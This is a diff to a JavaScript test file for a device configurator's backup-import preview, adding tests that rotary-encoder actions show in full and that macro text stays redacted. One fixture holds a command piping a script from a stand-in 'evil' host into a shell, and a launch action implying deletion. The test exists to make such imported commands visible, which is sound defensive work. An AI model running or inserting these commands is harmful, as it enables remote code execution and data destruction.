@@ -56,8 +56,13 @@ test("预览计数：覆盖数与按类型计数", () => {
   assert.equal(p.typeCounts.launch, 1);
   assert.equal(p.typeCounts.url, 1);
   assert.equal(p.typeCounts.macro, 1);
-  assert.equal(p.typeCounts.none, 1);
+  // WS-623：按类型计数含编码器两个方向（sampleData 的 CW/CCW 都是 none），
+  // 所以 none = 1 条输入 + 2 条编码器方向 = 3。
+  assert.equal(p.typeCounts.none, 3);
   assert.equal(p.typeCounts.media, 0);
+  // 「将覆盖」只数输入卡，编码器方向另列，口径写进模型里。
+  assert.equal(p.overrideIncludesEncoder, false);
+  assert.equal(p.encoderOverride, 2);
   assert.equal(p.filename, "backup.json");
   assert.equal(p.source, "Desk / ESP32-C3");
   assert.equal(p.exportedAt, "2026-11-14T10:00:00");
@@ -77,6 +82,57 @@ test("命令 / 路径 / 网址全文出现在预览，text:/paste: 正文不出�
   assert.ok(!p.safeText.includes(SECRET_PASTE));
   assert.ok(p.safeText.includes("text("));
   assert.ok(p.safeText.includes("paste("));
+});
+
+// WS-623 must fix 1：编码器 CW/CCW 会随导入写进存档并在旋转时执行，
+// 以前只遍历 inputs，这两条命令在预览里完全看不到。这条断言驱动生产函数
+// buildImportPreview，改回旧逻辑就会变红。
+test("编码器 CW/CCW 动作进入预览：命令全文可见、typeCounts 计入、带方向名", () => {
+  const d = {
+    schema: 1,
+    inputs: [{ index: 0, code: 0, mods: 0, action: { type: "none", value: "", macro: [] } }],
+    encoder: {
+      CW: { type: "command", value: "curl http://evil/x.sh | sh", macro: [] },
+      CCW: { type: "launch", value: "C:\\tools\\rm.exe --all", macro: [] },
+    },
+  };
+  // 与评审复现一致：3 个参数、不注入 i18n 文案（走 ASCII 默认方向名）。
+  const p = buildImportPreview(d, "b.json", 10);
+  // 会执行的命令必须完整可见。
+  assert.ok(p.safeText.includes("curl http://evil/x.sh | sh"));
+  assert.ok(p.safeText.includes("C:\\tools\\rm.exe --all"));
+  // 按类型计数含编码器方向动作。
+  assert.equal(p.typeCounts.command, 1);
+  assert.equal(p.typeCounts.launch, 1);
+  // 逐条列表带方向名，且「将覆盖」口径明确说明不含编码器。
+  assert.ok(p.safeText.includes("Encoder CW"));
+  assert.ok(p.safeText.includes("Encoder CCW"));
+  assert.equal(p.override, 1);
+  assert.equal(p.overrideIncludesEncoder, false);
+  assert.equal(p.encoderOverride, 2);
+  assert.equal(p.items.length, 2);
+});
+
+// 方向名由 app.js 用 t() 注入，可译、且共享模块不含硬编码中文。
+test("编码器方向名可注入 i18n 文案，宏 / text: 正文仍按口径脱敏", () => {
+  const d = {
+    schema: 1,
+    inputs: [],
+    encoder: {
+      CW: { type: "macro", value: "", macro: [
+        { type: "text", value: SECRET_TEXT },
+        { type: "key", value: "ctrl+alt+t" },
+      ] },
+      CCW: { type: "command", value: "echo hello", macro: [] },
+    },
+  };
+  const p = buildImportPreview(d, "b.json", 10, {
+    cw: "编码器·顺时针 (CW)", ccw: "编码器·逆时针 (CCW)",
+  });
+  assert.ok(p.safeText.includes("编码器·顺时针"));
+  assert.ok(p.safeText.includes("编码器·逆时针"));
+  assert.ok(p.safeText.includes("echo hello"));
+  assert.ok(p.safeText.includes("text(") && !p.safeText.includes(SECRET_TEXT));
 });
 
 test("macroStepDisplay 对 text:/paste: 只给长度，不带正文", () => {
@@ -144,10 +200,16 @@ test("预览相关文案在中英两套 locale 里都存在且占位符一致", 
   const keys = [
     "ui.backup_import_result",
     "ui.backup_import_override_count",
+    "ui.backup_import_override_encoder",
+    "ui.backup_encoder_cw",
+    "ui.backup_encoder_ccw",
     "ui.backup_import_skipped",
     "ui.backup_import_risk",
     "ui.backup_export_done",
     "ui.backup_need_device",
+    "error.actions_import_bad_code",
+    "error.actions_import_bad_mods",
+    "error.actions_import_save_failed",
   ];
   const ph = (s) => (s.match(/\{([a-zA-Z_][a-zA-Z0-9_]*)\}/g) || []).sort();
   keys.forEach((key) => {
